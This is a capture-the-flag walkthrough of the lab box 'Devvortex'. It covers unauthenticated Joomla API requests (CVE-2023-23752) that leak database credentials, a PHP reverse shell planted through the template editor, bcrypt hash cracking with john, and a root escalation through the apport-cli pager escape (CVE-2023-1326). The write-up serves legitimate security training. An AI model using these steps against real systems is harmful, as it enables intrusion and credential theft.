#Linux #Joomla #CVE #subdomainenum #ffuf #MySQL #john #apport #GTFOBins

## Overview

Devvortex is an easy Linux box that starts with subdomain discovery and a Joomla information-disclosure CVE. **CVE-2023-23752** leaks Joomla's configured database credentials through an unauthenticated API endpoint; those log into the admin panel, where the template editor gives PHP RCE. After cracking a database hash to move to a real user, root comes from **CVE-2023-1326** in `apport-cli`, a `less` pager escape.

## Recon

The apex redirects to `devvortex.htb`. Fuzzing for vhosts revealed a dev subdomain:

```sh
ffuf -u http://10.129.19.169 -H 'Host: FUZZ.devvortex.htb' -w subdomains-top1million-110000.txt -mc all -ac
->  dev.devvortex.htb
```

`/administrator` on that subdomain is a **Joomla** login. The version is readable from a manifest, a Joomla classic:

```
/administrator/manifests/files/joomla.xml   ->   4.2.6
```

## Foothold

### CVE-2023-23752 → Joomla Admin → RCE

> **The bug:** Joomla 4.x exposed its REST API without proper auth checks on certain endpoints. `?public=true` on the config and users endpoints dumps usernames and, critically, the database connection settings, including the password.

```
/api/index.php/v1/users?public=true            ->  logan, lewis
/api/index.php/v1/config/application?public=true ->  password: ‹redacted›
```

That password logged in as the super-user `lewis`. With super-user access, Joomla's template editor is RCE-by-design, I edited `error.php` to a PHP reverse shell and triggered it:

```
http://dev.devvortex.htb/templates/cassiopeia/error.php
```

```sh
rlwrap nc -lvnp 53
www-data@devvortex:/$ whoami
www-data
```

## Privilege Escalation

### MySQL Hashes → logan

The leaked credentials also worked for MySQL locally. Dumping the Joomla users table gave two bcrypt hashes; `logan`'s cracked:

```sql
select * from sd4fg_users;
-- lewis / logan bcrypt hashes
```

```sh
john hash --wordlist=rockyou.txt   ->   logan : ‹redacted›
su logan
```

### CVE-2023-1326, apport-cli sudo

```sh
sudo -l
User logan may run the following commands:
    (ALL : ALL) /usr/bin/apport-cli
```

> **Why this is root:** `apport-cli` pipes its crash report through a pager (`less`). When run as root via sudo, that pager runs as root too. `less` has a documented shell escape (`!cmd`). So I just need a crash file to feed it.

I forced a crash to generate the report, then opened it through the privileged `apport-cli` and escaped the pager:

```sh
sleep 20 & kill -ABRT $!            # creates /var/crash/_usr_bin_sleep.*.crash
sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
# choose V (view) -> opens less -> type:
!/bin/bash
```

## Root

```sh
root@devvortex:/tmp# whoami
root
```

Box rooted.

## Takeaways

- **Always fuzz for vhosts**, the vulnerable Joomla lived on `dev.`
- **CVE-2023-23752 leaks DB creds pre-auth**, and a Joomla super-user equals RCE via templates.
- **Pager-based sudo tools (`apport-cli`, anything wrapping `less`/`more`) are escapable.** The `!cmd` escape turns a "view report" prompt into a root shell.
